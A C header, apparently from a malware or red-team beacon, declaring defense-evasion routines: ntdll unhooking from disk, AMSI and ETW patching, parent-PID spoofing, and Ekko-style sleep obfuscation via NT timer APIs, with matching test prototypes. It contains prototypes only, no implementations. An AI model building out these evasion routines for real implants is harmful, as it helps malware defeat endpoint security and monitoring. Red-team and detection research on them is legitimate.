#ifndef EVASION_H
#define EVASION_H

#include "ntdefs.h"
#include "common.h"

// WIN32_API struct — used by Ekko in comms.c
typedef enum _EVENT_TYPE { NotificationEvent, SynchronizationEvent } EVENT_TYPE;

typedef struct _WIN32_API {
  NTSTATUS(NTAPI *RtlCreateTimerQueue)(_Out_ PHANDLE TimerQueueHandle);
  NTSTATUS(NTAPI *RtlCreateTimer)(_In_ HANDLE TimerQueueHandle,
                                  _Out_ PHANDLE Handle,
                                  _In_ WAITORTIMERCALLBACKFUNC Function,
                                  _In_opt_ PVOID Context, _In_ ULONG DueTime,
                                  _In_ ULONG Period, _In_ ULONG Flags);
  NTSTATUS(NTAPI *RtlDeleteTimerQueue)(_In_ HANDLE TimerQueueHandle);
  NTSTATUS(NTAPI *NtCreateEvent)(_Out_ PHANDLE EventHandle,
                                 _In_ ACCESS_MASK DesiredAccess,
                                 _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
                                 _In_ EVENT_TYPE EventType,
                                 _In_ BOOLEAN InitialState);
  NTSTATUS(NTAPI *NtWaitForSingleObject)(_In_ HANDLE Handle,
                                         _In_ BOOLEAN Alertable,
                                         _In_opt_ PLARGE_INTEGER Timeout);
  NTSTATUS(NTAPI *NtSignalAndWaitForSingleObject)(
      _In_ HANDLE SignalHandle, _In_ HANDLE WaitHandle, _In_ BOOLEAN Alertable,
      _In_opt_ PLARGE_INTEGER Timeout);
  PVOID SystemFunction032;
  PVOID NtContinue;
} WIN32_API, *PWIN32_API;

// Public prototypes
BOOL MapNtdllFromDisk(OUT PVOID *ppNtdllBuf);
PVOID FetchLocalNtdllBaseAddress(VOID);
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll);
BOOL unhook_ntdll(VOID);
BOOL patch_amsi(VOID);
BOOL patch_etw(VOID);
BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe, PPROCESS_INFORMATION pPi);
BOOL evasion_run(VOID);

#ifdef BEACON_TEST
BOOL test_ntdll_map_from_disk(void);
BOOL test_ntdll_fetch_local_base(void);
BOOL test_ntdll_unhook_success(void);
BOOL test_ntdll_replace_text(void);
BOOL test_amsi_patch_success(void);
BOOL test_amsi_not_loaded(void);
BOOL test_etw_patch_success(void);
BOOL test_evasion_full_pipeline(void);
#endif

#endif /* EVASION_H */